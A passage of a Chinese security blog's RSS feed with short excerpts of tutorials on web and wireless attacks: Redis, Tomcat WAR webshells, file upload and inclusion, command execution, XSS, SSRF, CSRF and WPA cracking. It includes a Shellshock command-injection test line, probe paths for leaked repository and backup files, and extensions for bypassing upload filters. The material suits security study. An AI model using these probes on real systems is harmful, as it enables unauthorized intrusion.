&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">demodata&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">txt中读取内容写入到config_update&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php，但demodata&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">txt为空，&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">所以就清空了config_update&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://wyb0.com/img/post/dedecms_before_20150617_clear_config_update.png" alt="清空文件config_update">&lt;/p></description></item><item><title>Redis 未授权访问漏洞</title><link>https://wyb0.com/posts/2016/redis-unauthorized-access/</link><pubDate>Thu, 04 Aug 2016 15:52:26 +0000</pubDate><guid>https://wyb0.com/posts/2016/redis-unauthorized-access/</guid><description>&lt;h3 id="0x00-redis的未授权访问">0x00 Redis的未授权访问&lt;/h3>
&lt;p>若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。&lt;/p>
&lt;p>若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。&lt;/p></description></item><item><title>Tomcat 部署 War 包 getshell</title><link>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link><pubDate>Tue, 02 Aug 2016 22:30:13 +0000</pubDate><guid>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</guid><description>&lt;h3 id="0x00-关于-war-包">0x00 关于 War 包&lt;/h3>
&lt;pre tabindex="0">&lt;code>War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
服务器启动时,War包也会随之被解压后自动部署。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-上传-war-包-getshell">0x01 上传 War 包 GetShell&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>找到后台猜密码然后登录
&lt;img src="https://wyb0.com/img/post/tomcat_vul_background.png" alt="70">
&lt;img src="https://wyb0.com/img/post/tomcat_vul_login.png" alt="40">
&lt;img src="https://wyb0.com/img/post/tomcat_vul_war_login_success.png" alt="30">&lt;/p></description></item><item><title>BurpSuite 的 Intruder 模块</title><link>https://wyb0.com/posts/2016/burpsuite-intruder-module/</link><pubDate>Mon, 01 Aug 2016 09:17:38 +0000</pubDate><guid>https://wyb0.com/posts/2016/burpsuite-intruder-module/</guid><description>&lt;h3 id="0x00-示例一">0x00 示例一&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_caught.png" alt="burpsuite抓包发送给intruder模">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_attack_type1.png" alt="burpsuite的intruder模块的攻击类型1">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_attack_type2.png" alt="burpsuite的intruder模块的攻击类型2">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_payload_set.png" alt="burpsuite的intruder模块payload设置">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_payload_set_variable1.png" alt="burpsuite的intruder模块payload设置变量1">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_payload_set_variable2.png" alt="burpsuite的intruder模块payload设置变量2">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_payload_processing_rule.png" alt="burpsuite的intruder模块payload设置的特殊处理">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_start_attack.png" alt="burpsuite的intruder模块开始攻击">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_attack_interface.png" alt="burpsuite的intruder攻击界面">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_screening_attack_results.png" alt="burpsuite的intruder筛选攻击结果">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder_attack_results.png" alt="burpsuite的intruder筛选后的攻击结果">&lt;/p>
&lt;h3 id="0x01-示例二">0x01 示例二&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/burpsuite_intruder1.png" alt="burpsuite的intruder1">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder2.png" alt="burpsuite的intruder2">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder3.png" alt="burpsuite的intruder3">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder4.png" alt="burpsuite的intruder4">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder5.png" alt="burpsuite的intruder5">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder6.png" alt="burpsuite的intruder6">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder7.png" alt="burpsuite的intruder7">
&lt;img src="https://wyb0.com/img/post/burpsuite_intruder8.png" alt="burpsuite的intruder8">&lt;/p></description></item><item><title>逻辑漏洞</title><link>https://wyb0.com/posts/2016/logical-loophole/</link><pubDate>Sun, 31 Jul 2016 18:43:49 +0000</pubDate><guid>https://wyb0.com/posts/2016/logical-loophole/</guid><description>&lt;h3 id="0x00-逻辑漏洞">0x00 逻辑漏洞&lt;/h3>
&lt;p>逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。
这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。&lt;/p>
&lt;h3 id="0x01-密码找回漏洞">0x01 密码找回漏洞&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>测试流程&lt;/p></description></item><item><title>敏感信息泄露</title><link>https://wyb0.com/posts/2016/sensitive-information-leakage/</link><pubDate>Thu, 28 Jul 2016 22:42:58 +0000</pubDate><guid>https://wyb0.com/posts/2016/sensitive-information-leakage/</guid><description>&lt;h3 id="0x00-软件敏感信息">0x00 软件敏感信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>* 操作系统版本
 可用namp扫描得知
* 中间件的类型、版本
 http返回头
 404报错页面
 使用工具(如whatweb)
* Web程序(cms类型及版本、敏感文件)
 可用whatweb、cms_identify
&lt;/code>&lt;/pre>&lt;h3 id="0x01-web敏感信息">0x01 Web敏感信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>* phpinfo()信息泄露
 http://[ip]/test.php和http://[ip]/phpinfo.php
* 测试页面泄露在外网
 test.cgi、phpinfo.php、info.php等
* 编辑器备份文件泄露在外网
 http://[ip]/.test.php.swp
 http://[ip]/test.php.bak
 http://[ip]/test.jsp.old
 http://[ip]/cgi~
 常见编辑器备份后缀
* 版本管理工具(如git)文件信息泄露
 http://[ip]/.git/config
 http://[ip]/CVS/Entriesp
 http://[ip]/.svn/entriesp
* HTTP认证泄露漏洞
 http://[ip]/basic/index.php
 Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码
* 管理后台地址泄露
 http://[ip]/login.php
 http://[ip]/admin.php
 http://[ip]/manager.php
 http://[ip]/admin_login.php
* 泄露员工邮箱、分机号码
 泄露邮箱及分机号码可被社工，也可生成字典
* 错误页面暴漏信息
 mysql错误、php错误、暴漏cms版本等
* 探针文件
* robots.txt
* phpMyAdmin
* 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等)
* 其他
&lt;/code>&lt;/pre>&lt;h3 id="0x02-网络信息泄露">0x02 网络信息泄露&lt;/h3>
&lt;pre tabindex="0">&lt;code>* DNS域传送漏洞
* 运维监控系统弱口令、网络拓扑泄露
 zabbix弱口令、zabbix sql注入等
&lt;/code>&lt;/pre>&lt;h3 id="0x03-第三方软件应用">0x03 第三方软件应用&lt;/h3>
&lt;pre tabindex="0">&lt;code>* github上源码、数据库、邮箱密码泄露
 搜类似：smtp 163 password关键字
* 百度网盘被员工不小心上传敏感文件
* QQ群被员工不小心上传敏感文件
&lt;/code>&lt;/pre>&lt;h3 id="0x04-敏感信息搜集工具">0x04 敏感信息搜集工具&lt;/h3>
&lt;pre tabindex="0">&lt;code>https://github.com/ring04h/weakﬁlescan
https://github.com/lijiejie/BBScan
whatweb
dnsenum
github
&lt;/code>&lt;/pre>&lt;h3 id="0x05-示例">0x05 示例&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/sensitive_information_leakage.png" alt="敏感信息泄露">&lt;/p></description></item><item><title>任意文件查看与下载漏洞</title><link>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</link><pubDate>Wed, 27 Jul 2016 23:25:18 +0000</pubDate><guid>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</guid><description>&lt;h3 id="0x00-漏洞介绍">0x00 漏洞介绍&lt;/h3>
&lt;p>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞&lt;/p></description></item><item><title>文件包含漏洞</title><link>https://wyb0.com/posts/2016/file-include-vulnerabilities/</link><pubDate>Tue, 26 Jul 2016 09:24:22 +0000</pubDate><guid>https://wyb0.com/posts/2016/file-include-vulnerabilities/</guid><description>&lt;p>环境：phpStudy 2016、DVWA v1.10&lt;/p>
&lt;h3 id="0x00-文件包含">0x00 文件包含&lt;/h3>
&lt;p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。&lt;/p></description></item><item><title>代码执行漏洞(一)</title><link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link><pubDate>Mon, 25 Jul 2016 22:32:51 +0000</pubDate><guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid><description>&lt;h3 id="0x00-代码执行">0x00 代码执行&lt;/h3>
&lt;p>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。&lt;/p></description></item><item><title>命令执行漏洞</title><link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link><pubDate>Sun, 24 Jul 2016 14:32:51 +0000</pubDate><guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid><description>&lt;h3 id="0x00-命令执行">0x00 命令执行&lt;/h3>
&lt;pre tabindex="0">&lt;code>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用条件">0x01 利用条件&lt;/h3>
&lt;ol>
&lt;li>应用调用执行系统命令的函数&lt;/li>
&lt;li>将用户输入作为系统命令的参数拼接到了命令行中&lt;/li>
&lt;li>没有对用户输入进行过滤或过滤不严&lt;/li>
&lt;/ol>
&lt;h3 id="0x02-漏洞分类">0x02 漏洞分类&lt;/h3>
&lt;ol>
&lt;li>代码层过滤不严&lt;br>
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：&lt;br>
system(&amp;quot;/bin/program --arg $arg&amp;quot;);&lt;/li>
&lt;li>系统的漏洞造成命令执行&lt;br>
bash破壳漏洞(CVE-2014-6271)&lt;br>
执行&lt;code>env x='() { :;}; echo vulnerable' bash -c &amp;quot;echo this is a test&amp;quot;&lt;/code>后&lt;br>
若输出vulnerable则证明存在漏洞&lt;/li>
&lt;li>调用的第三方组件存在代码执行漏洞&lt;br>
如WordPress中用来处理图片的ImageMagick组件&lt;br>
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)&lt;br>
ThinkPHP命令执行&lt;/li>
&lt;/ol>
&lt;h3 id="0x03-漏洞危害">0x03 漏洞危害&lt;/h3>
&lt;ol>
&lt;li>继承Web服务程序的权限去执行系统命令或读写文件&lt;/li>
&lt;li>反弹shell&lt;/li>
&lt;li>控制整个网站甚至控制服务器&lt;/li>
&lt;li>进一步内网渗透&lt;/li>
&lt;li>等等&lt;/li>
&lt;/ol>
&lt;h3 id="0x04-漏洞挖掘">0x04 漏洞挖掘&lt;/h3>
&lt;p>可以google hacking&lt;br>
尝试：filetype:action或filetype:do来找struts2&lt;/p></description></item><item><title>文件上传之文本编辑器上传漏洞</title><link>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</link><pubDate>Thu, 21 Jul 2016 15:11:29 +0000</pubDate><guid>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</guid><description>&lt;h3 id="0x00-文本编辑器">0x00 文本编辑器&lt;/h3>
&lt;p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。&lt;/p></description></item><item><title>文件上传漏洞常见绕过手法</title><link>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</link><pubDate>Wed, 20 Jul 2016 17:04:44 +0000</pubDate><guid>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</guid><description>&lt;h3 id="0x00-一般防止上传漏洞手法">0x00 一般防止上传漏洞手法&lt;/h3>
&lt;pre tabindex="0">&lt;code>1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证
 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少
 //服务器开销，而服务端验证才可以真正防御攻击者。 
2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法
&lt;/code>&lt;/pre>&lt;h3 id="0x01-客户端检测">0x01 客户端检测&lt;/h3>
&lt;p>客户端验证代码形如下：&lt;/p></description></item><item><title>文件上传漏洞与文件解析漏洞</title><link>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</link><pubDate>Wed, 20 Jul 2016 11:30:53 +0000</pubDate><guid>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</guid><description>&lt;h3 id="0x00-文件上传漏洞">0x00 文件上传漏洞&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 上传后得到的权限&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. 后台权限：登陆了后台，可以进行一些操作、配置
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. 网站权限：获得了webshell，可以进行查看源代码等操作
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. 服务器权限：可以对服务器进行任意操作
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-文件上传漏洞分类">0x01 文件上传漏洞分类&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 配置不当可直接上传shell
 HTTP的PUT方法开启了
2. 文件解析漏洞导致文件执行
 Web容器解析漏洞
3. 本地文件上传限制被绕过
 BurpSuite抓包修改即可绕过
4. 服务端过滤不严或被绕过
 使用了黑名单过滤
5. 文件路径截断上传
 00截断等
6. 开源编辑器上传漏洞
 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞
&lt;/code>&lt;/pre>&lt;h3 id="0x02-文件上传漏洞利用条件">0x02 文件上传漏洞利用条件&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径
2. 其次,用户能从web访问这个文件
3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败
&lt;/code>&lt;/pre>&lt;h3 id="0x03-文件上传漏洞挖掘">0x03 文件上传漏洞挖掘&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 查找上传点，如图片、附件、头像的上传等
2. 找类似upload的目录、类似upload.php的文件
3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等
&lt;/code>&lt;/pre>&lt;h3 id="0x04-常见可执行文件后缀">0x04 常见可执行文件后缀&lt;/h3>
&lt;pre tabindex="0">&lt;code>可用于绕过：
php php2 php3 php5 phtml
asp aspx ascx ashx cer asa
jsp jspx jspf
&lt;/code>&lt;/pre>&lt;h3 id="0x05-解析漏洞">0x05 解析漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>文件上传漏洞通常与Web容器的解析漏洞配合利用
常见Web容器有IIS、Nginx、Apache、Tomcat等
&lt;/code>&lt;/pre>&lt;h3 id="0x06-iis解析漏洞">0x06 IIS解析漏洞&lt;/h3>
&lt;p>IIS6.0在解析文件时存在以下两个解析漏洞&lt;/p></description></item><item><title>一次存储型 XSS 利用实例</title><link>https://wyb0.com/posts/2016/recording-an-stored-xss/</link><pubDate>Sun, 17 Jul 2016 23:30:54 +0000</pubDate><guid>https://wyb0.com/posts/2016/recording-an-stored-xss/</guid><description>&lt;p>首先感谢凯神的指导&lt;/p>
&lt;h3 id="0x00-注册账号">0x00 注册账号&lt;/h3>
&lt;p>先得到一个临时邮箱，然后注册账号
&lt;img src="https://wyb0.com/img/post/xss_example_get_temporary_email.png" alt="65">&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/xss_example_register.png" alt="35">&lt;/p>
&lt;h3 id="0x01-找输入输出点">0x01 找输入输出点&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/xss_example_add_topic.png" alt="40">&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/xss_example_input_output_point.png" alt="80">&lt;/p>
&lt;h3 id="0x02-尝试构造payload">0x02 尝试构造payload&lt;/h3>
&lt;p>payload用如下的即可：&lt;/p></description></item><item><title>XSS 漏洞及其挖掘方法</title><link>https://wyb0.com/posts/2016/xss-basis-and-use/</link><pubDate>Fri, 15 Jul 2016 10:30:54 +0000</pubDate><guid>https://wyb0.com/posts/2016/xss-basis-and-use/</guid><description>&lt;h3 id="0x00-简介">0x00 简介&lt;/h3>
&lt;p>XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;quot;脚本&amp;quot;这两个字上，脚本主要有两个：JavaScript和ActionScript。&lt;br>
&lt;f>要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。&lt;/f>&lt;/p></description></item><item><title>无线下 ettercap 做中间人攻击</title><link>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link><pubDate>Wed, 13 Jul 2016 09:22:39 +0000</pubDate><guid>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid><description>&lt;p>前提：攻击主机和被攻击主机在一个无线下面&lt;/p>
&lt;h3 id="0x00-打开ettercap">0x00 打开ettercap&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/wireless_start_ettercap.png" alt="无线网络渗透测试打开ettercap">&lt;/p>
&lt;h3 id="0x01-查看host列表">0x01 查看host列表&lt;/h3>
&lt;p>在软件的图形化界面点击sniff，选择unified sniffing选择网卡，然后单击hosts选项，选择scan for host，然后选择host list
&lt;img src="https://wyb0.com/img/post/wireless_ettercap_see_host_list.png" alt="无线网络渗透测试ettercap查看host列表">&lt;/p></description></item><item><title>攻击 WPA 保护下的 802.11 网络</title><link>https://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</link><pubDate>Wed, 13 Jul 2016 08:18:59 +0000</pubDate><guid>https://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</guid><description>&lt;h3 id="0x00-网络拓扑及信息">0x00 网络拓扑及信息&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/wireless_topology.png" alt="无线网络渗透测试拓扑图">
其中 ip 等信息如下：
&lt;img src="https://wyb0.com/img/post/wireless_base_msg.png" alt="无线网络渗透测试IP等基本信息">&lt;/p>
&lt;h3 id="0x01-获取信息">0x01 获取信息&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>查看无线网卡并将其设置为监听模式
&lt;img src="https://wyb0.com/img/post/wireless_ifconfig.png" alt="无线网络渗透测试查看网卡信息">
&lt;img src="https://wyb0.com/img/post/wireless_mode_to_monitor.png" alt="无线网络渗透测试设置网卡为监听模式">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>打开 kismet，进行基本设置
&lt;img src="https://wyb0.com/img/post/wireless_start_kismet.png" alt="无线网络渗透测试开启kismet">
&lt;img src="https://wyb0.com/img/post/wireless_kismet_add_source.png" alt="无线网络渗透测试add source">
&lt;img src="https://wyb0.com/img/post/wireless_kismet.png" alt="无线网络渗透测试kismet主界面">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>选择名字为 111111 的 AP 为目标
&lt;img src="https://wyb0.com/img/post/wireless_select_target.png" alt="无线网络渗透测试kismet选择目标">
&lt;img src="https://wyb0.com/img/post/wireless_target_msg.png" alt="无线网络渗透测试AP的信息">
&lt;img src="https://wyb0.com/img/post/wireless_quit_kismet.png" alt="无线网络渗透测试退出kismet">&lt;/p></description></item><item><title>SSRF</title><link>https://wyb0.com/posts/2016/ssrf/</link><pubDate>Thu, 30 Jun 2016 15:30:54 +0000</pubDate><guid>https://wyb0.com/posts/2016/ssrf/</guid><description>&lt;h3 id="0x00-什么是ssrf">0x00 什么是SSRF&lt;/h3>
&lt;p>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，&lt;font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务&lt;/font>，SSRF的攻击目标一般是&lt;font color="FF0000">内网&lt;/font>。&lt;br>
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。&lt;/p></description></item><item><title>sqlmapapi 的简单使用</title><link>https://wyb0.com/posts/2016/sqlmapapi-usage/</link><pubDate>Tue, 28 Jun 2016 11:19:11 +0000</pubDate><guid>https://wyb0.com/posts/2016/sqlmapapi-usage/</guid><description>&lt;h3 id="0x00-关于sqlmapapipy">0x00 关于sqlmapapi.py&lt;/h3>
&lt;p>当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量&lt;/p>
&lt;h3 id="0x01-用于交互的方法">0x01 用于交互的方法&lt;/h3>
&lt;p>在sqlmap/lib/utils/api.py中:&lt;/p></description></item><item><title>CSRF 漏洞</title><link>https://wyb0.com/posts/2016/csrf/</link><pubDate>Tue, 28 Jun 2016 09:21:34 +0000</pubDate><guid>https://wyb0.com/posts/2016/csrf/</guid><description>&lt;h3 id="0x00-概念">0x00 概念&lt;/h3>
&lt;p>当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。&lt;/p></description></item><item><title>SQL 注入之防御</title><link>https://wyb0.com/posts/2016/injection-of-defense/</link><pubDate>Sat, 25 Jun 2016 10:25:11 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-defense/</guid><description>&lt;h3 id="0x00-要做的事">0x00 要做的事&lt;/h3>
&lt;p>也就是找到注入点然后修复&lt;/p>
&lt;h3 id="0x01-防御方法">0x01 防御方法&lt;/h3>
&lt;ul>
&lt;li>使用预编译语句绑定变量(比如php的mysqli、pdo)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//预编译
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $mysqli &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">mysqli&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;root&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;123456&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;share&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $mysqli&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">query&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;set names utf8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s &lt;span style="color:#f92672">=&lt;/span> $mysqli&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">prepare&lt;/span>($sql);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//绑定参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Tom&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sex &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;M&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">bind_param&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ssi&amp;#34;&lt;/span>,$name,$sex,$age);&lt;span style="color:#75715e">//ssi的意思是字符、字符、整型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//执行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $result &lt;span style="color:#f92672">=&lt;/span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">execute&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_dump&lt;/span>($result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">close&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>使用存储过程(这里以SQLServer举例)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>--如果存在名为get_student_msg(相当于函数)的存储过程则删除
IF EXISTS (SELECT name FROM sysobjects WHERE name=&amp;#39;get_student_msg&amp;#39; AND type=&amp;#39;p&amp;#39;)
 DROP PROCEDURE get_student_msg

CREATE PROCEDURE get_student_msg --创建存储过程
 @name VARCHAR(20) --声明全局变量
AS
 BEGIN
 SELECT * from info
 WHERE name=@name
 END
GO

--创建好存储过程后在其他地方直接使用函数并传参就行了
EXEC get_student_msg &amp;#39;xiaoli&amp;#39;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>使用转义函数&lt;br>
如：addslashes()和mysql_real_escape_string()&lt;br>
在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//简单过滤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_GET,&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_POST,&lt;span style="color:#f92672">&amp;amp;&lt;/span>$_COOKIE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($filter &lt;span style="color:#66d9ef">as&lt;/span> $key &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $value){
